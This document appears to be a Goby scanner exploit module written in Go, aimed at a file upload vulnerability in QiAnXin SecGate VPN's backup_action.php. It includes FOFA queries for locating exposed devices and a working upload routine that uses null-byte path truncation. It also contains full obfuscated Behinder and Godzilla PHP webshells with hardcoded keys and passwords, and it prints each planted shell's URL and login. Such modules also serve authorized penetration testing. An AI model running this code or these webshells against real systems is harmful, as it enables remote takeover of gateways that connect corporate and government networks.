package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "QiAnXin SecGate VPN backup_action.php file upload vulnerability",
    "Description": "<p>SecGate VPN is a composite VPN access gateway launched by Qi’anxin, which connects mobile computing terminals to corporate and government internal networks.</p><p>SecGate VPN has a file upload vulnerability. An attacker can write a backdoor to the web server through the backup_action.php path, thereby invading the server and obtaining administrator rights of the server.</p>",
    "Product": "legendsec-VPN",
    "Homepage": "https://www.legendsec.com/",
    "DisclosureDate": "2021-04-10",
    "PostTime": "2023-09-14",
    "Author": "gp827782797@qq.com",
    "FofaQuery": "header=\"host_for_cookie\" || banner=\"host_for_cookie\" || body=\"/images/sslvpnportallogo.jpg\" || (title=\"网关\" && body=\"/images/sslvpnportallogo.jpg\") || body=\"admin/js/virtual_keyboard.js\" || (cert=\"Organization: SecWorld\" && cert=\"Organizational Unit: vpn\") || title=\"网神VPN安全网关系统\" || banner=\"mod_pass_param\" || header=\"mod_pass_param\" || cert=\"SecGate\"",
    "GobyQuery": "header=\"host_for_cookie\" || banner=\"host_for_cookie\" || body=\"/images/sslvpnportallogo.jpg\" || (title=\"网关\" && body=\"/images/sslvpnportallogo.jpg\") || body=\"admin/js/virtual_keyboard.js\" || (cert=\"Organization: SecWorld\" && cert=\"Organizational Unit: vpn\") || title=\"网神VPN安全网关系统\" || banner=\"mod_pass_param\" || header=\"mod_pass_param\" || cert=\"SecGate\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\"; ?>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "奇安信网神 VPN backup_action.php 文件上传漏洞",
            "Product": "网神-VPN",
            "Description": "<p>网神 VPN 是奇安信推出的一款复合型 VPN 接入网关，将移动计算终端接入到企业、政府内部网络。<br></p><p>奇安信网神 VPN 存在文件上传漏洞，攻击者可通过 backup_action.php 路径向 web 服务器写入后门，从而入侵服务器，获取服务器的管理员权限。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端写入后门，执行代码，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "QiAnXin SecGate VPN backup_action.php file upload vulnerability",
            "Product": "legendsec-VPN",
            "Description": "<p>SecGate VPN is a composite VPN access gateway launched by Qi’anxin, which connects mobile computing terminals to corporate and government internal networks.</p><p>SecGate VPN has a file upload vulnerability. An attacker can write a backdoor to the web server through the backup_action.php path, thereby invading the server and obtaining administrator rights of the server.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10182"
}`

	sendPayload28270a8b := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/admin/system/backup_action.php?cmd")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		boundary := goutils.RandomHexString(32)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary="+boundary)
		cfg.Data = strings.ReplaceAll(`--`+boundary+`
Content-Disposition: form-data; name="userfile"; filename="xxx.txt"
Content-Type: text/plain

`+content+`
--`+boundary+`
Content-Disposition:  form-data; name="CFG_UPLOAD_PATH"

/ssl/www/admin/system/`+filename+"\x00", "\n", "\r\n")
		_, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}

		cfgCheck := httpclient.NewGetRequestConfig("/admin/system/" + filename)
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(16) + ".php"
			rsp, _ := sendPayload28270a8b(u, filename, "<?php @error_reporting(0);echo \""+checkString+"\";unlink(__FILE__);?>")
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkString) && !strings.Contains(rsp.Utf8Html, "<?php")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			webshell := goutils.B2S(ss.Params["webshell"])
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".php"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
			}
			rsp, err := sendPayload28270a8b(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			if attackType != "custom" && webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType != "custom" && webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}
